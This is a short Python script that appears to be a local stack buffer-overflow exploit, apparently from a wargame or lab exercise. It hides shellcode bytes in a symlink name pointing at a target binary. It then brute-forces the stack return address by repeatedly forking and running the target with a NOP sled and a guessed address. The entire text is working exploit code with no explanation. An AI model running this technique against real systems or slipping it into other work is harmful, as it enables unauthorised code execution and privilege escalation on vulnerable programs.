#!/usr/bin/python

import sys,os

TARGET = os.getcwd()+"/"+sys.argv[1]

symlink = "\x68\xf9\xbf\x0f\x40\x68\xe0\x91\x03\x40\xb8\xe0\x8a\x05\x40\x50\xc3"

if not os.path.islink(symlink):
    os.symlink(TARGET,symlink)

for high in range(0xff,0x00,-1):
    for low in range(0xff,0x00,-1):
        payload = "\x90"*44
        retn = chr(low) + chr(high) + "\xff\xbf"
        payload = payload + retn
        pid = os.fork()
        if pid == 0:
            os.execv(symlink,(symlink,payload))
        else:
            os.wait()
